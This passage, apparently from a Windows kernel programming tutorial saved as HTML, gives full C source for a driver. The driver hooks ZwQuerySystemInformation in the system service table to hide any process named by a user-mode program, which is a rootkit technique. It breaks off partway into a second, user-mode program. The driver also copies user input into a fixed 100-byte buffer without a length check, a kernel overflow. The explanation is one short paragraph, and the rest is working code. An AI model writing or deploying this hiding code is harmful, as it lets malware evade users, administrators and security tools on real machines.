<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p46<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
gDeviceName,gSymbolicLinkName;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PDEVICE_OBJECT
gpDeviceObject;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define DRV_NAME
L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS
NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char pname[100];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
inputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char
*ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef NTSTATUS
(*qtype)(ULONG SystemInformationCLass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_PROCESSES<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>NextEntryDelta;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ThreadCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>Reserved[6];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>CreateTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>UserTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>KernelTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING<span
style="mso-spacerun: yes">  </span>ProcessName;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc =
OldZwQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(rc == 0 &amp;&amp;
5 == SystemInformationClass)<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_PROCESSES *prev = NULL;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(1)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ANSI_STRING
process_name;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlUnicodeStringToAnsiString(&amp;process_name,&amp;curr-&gt;ProcessName,TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s
curr=%x prev=%x
Delta=%d&quot;,process_name.Buffer,curr,prev,curr-&gt;NextEntryDelta);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(strnicmp(process_name.Buffer,pname,inputBufferLength)
== 0)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(curr-&gt;NextEntryDelta
!= 0 &amp;&amp; prev != 0) //first guy has no name<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Between
%s curr-&gt;NextEntryDelta=%x
prev=%x&quot;,process_name.Buffer,curr-&gt;NextEntryDelta,prev);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryDelta
+= curr-&gt;NextEntryDelta;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Last&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryDelta
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev = curr;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if (
curr-&gt;NextEntryDelta)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>((char *)curr +=
curr-&gt;NextEntryDelta);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long no;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION
esp;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>esp =
IoGetCurrentIrpStackLocation(pIrp);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(esp-&gt;MajorFunction == IRP_MJ_CREATE)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(esp-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *inputBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION<span
style="mso-spacerun: yes">      </span>irpStack;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>irpStack =
IoGetCurrentIrpStackLocation (pIrp);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>inputBuffer =
pIrp-&gt;AssociatedIrp.SystemBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>inputBufferLength =
irpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strncpy(pname,inputBuffer,inputBufferLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;inputBuffer=%s
inputBufferLength=%d&quot;,inputBuffer,inputBufferLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(pIrp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoDeleteSymbolicLink(&amp;gSymbolicLinkName);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoDeleteDevice(gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gDeviceName,L&quot;\\Device\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gSymbolicLinkName,L&quot;\\DosDevices\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateDevice(driverObject,0,&amp;gDeviceName,FILE_DEVICE_UNKNOWN,0,0,&amp;gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateSymbolicLink(&amp;gSymbolicLinkName,
&amp;gDeviceName);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
3 KeServiceDescriptorTable=%x&quot;,KeServiceDescriptorTable);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char
*)ZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no = *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQuerySystemInformation=(qtype)KeServiceDescriptorTable.ServiceTableBase[no];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<pre><span style='mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style";
mso-fareast-font-family:"Times New Roman"'>return(STATUS_SUCCESS);<o:p></o:p></span></pre>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>There
is not much we have to explain in the above programs. In y,c we pass the second
argv passed on the command line to the driver. Thus we run the programs as y –I
calc. In the driver we use the input buffer and input buffer length to give us
the name and length of data passed. We use these values in the strnicmp instead
of the hard code names used earlier. This only gives our program more
flexibility.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P47<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>x.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef long
(_stdcall *qtype)(long SystemInformationCLass,void *SystemInformation,long
SystemInformationLength,long * ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
pZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct UNICODE_STRING<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>short Length,
MaxLength;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned short
*Buffer;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct sss<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>NextEntryDelta;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ThreadCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>Reserved[6];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>CreateTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>UserTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>KernelTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
UNICODE_STRING<span style="mso-spacerun: yes">  </span>ProcessName;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long<span
style="mso-spacerun: yes">       </span>BasePriority;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
